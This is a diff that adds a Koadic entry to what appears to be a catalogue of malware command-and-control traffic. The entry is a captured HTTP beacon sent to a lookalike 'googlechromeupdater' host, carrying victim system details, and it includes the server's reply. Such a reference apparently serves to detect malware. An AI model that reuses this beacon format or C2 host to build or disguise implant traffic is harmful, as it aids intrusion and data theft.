@@ -1217,6 +1217,28 @@ Cache-Control: no-cache
 ~~~
 ![alt text](https://github.com/silence-is-best/c2db/blob/master/images/keybase.png "Keybase")
 
+#### Koadic
+~~~
+POST /html?CRADZPYFZ4=825b2f6bafed407c88254aa1e804be93;9Q90FBZM0Q=; HTTP/1.1
+Connection: Keep-Alive
+Content-Type: application/octet-stream
+Accept: */*
+Accept-Language: en-us
+User-Agent: Mozilla/4.0 (compatible; Win32; WinHttp.WinHttpRequest.5)
+encoder: 1252
+shellchcp: 437
+Content-Length: 140
+Host: googlechromeupdater.twilightparadox.com:448
+
+USER-PC\admin~~~USER-PC~~~Windows 7 Professional***7601~~~Unknown~~~x86~~~C:\Users\admin\AppData\Local\Temp
+~~~192.168.100.159~~~1252~~~437
+
+HTTP/1.0 200 OK
+Server: Apache
+Date: Wed, 22 Jan 2020 16:29:00 GMT
+~~~
+![alt text](https://github.com/silence-is-best/c2db/blob/master/images/koadic.png "Koadic")
+
 #### Kpot stealer
 Follow tcp stream, not http stream in wireshark
 ~~~
